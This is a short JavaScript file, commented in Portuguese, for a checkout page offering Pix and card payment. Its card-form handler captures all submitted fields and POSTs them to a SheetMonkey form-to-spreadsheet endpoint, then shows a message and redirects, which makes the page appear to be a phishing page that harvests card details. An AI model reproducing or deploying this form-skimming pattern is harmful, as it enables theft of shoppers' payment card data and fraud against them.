document.addEventListener("DOMContentLoaded", function () {
    const pixButton = document.querySelector(".payment-button.pix");
    const cardButton = document.querySelector(".payment-button.card");
    const paymentOptions = document.querySelector(".payment-options");
    const pixCheckout = document.getElementById("pix-checkout");
    const cardCheckout = document.getElementById("card-checkout");
    const messageDiv = document.getElementById("message");

    // Exibe o checkout Pix
    pixButton.addEventListener("click", function () {
        paymentOptions.style.display = "none"; // Oculta as opções de pagamento
        pixCheckout.style.display = "block"; // Exibe o checkout Pix
    });

    // Exibe o checkout Cartão
    cardButton.addEventListener("click", function () {
        paymentOptions.style.display = "none"; // Oculta as opções de pagamento
        cardCheckout.style.display = "block"; // Exibe o checkout Cartão

        // Adiciona o evento de submit ao formulário
        const cardForm = document.getElementById("cardForm");
        cardForm.addEventListener("submit", function (event) {
            event.preventDefault(); // Impede o envio padrão do formulário

            // Captura os dados do formulário
            const formData = new FormData(cardForm);
            const data = Object.fromEntries(formData.entries());

            // Envia os dados para a API
            fetch("https://api.sheetmonkey.io/form/pAvRNPLKm6ztAEpCUSqB97", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            })
                .then((response) => {
                    if (response.ok) {
                        // Exibe a mensagem para novos usuários
                        cardCheckout.style.display = "none"; // Oculta o checkout do cartão
                        messageDiv.style.display = "block"; // Exibe a mensagem

                        // Aguarda 5 segundos antes de redirecionar
                        setTimeout(() => {
                            window.location.href = "pagamento.html"; // Redireciona para a página de pagamento
                        }, 5000); // 5 segundos
                    } else {
                        alert("Erro ao enviar os dados. Tente novamente.");
                    }
                })
                .catch((error) => {
                    alert("Erro ao conectar com a API. Verifique sua conexão.");
                    console.error(error);
                });
        });
    });
});

// Função para copiar o código Pix
function copyPixCode() {
    const pixCodeInput = document.getElementById("pixCode");
    pixCodeInput.select();
    document.execCommand("copy");
    alert("Código Pix copiado para a área de transferência!");
}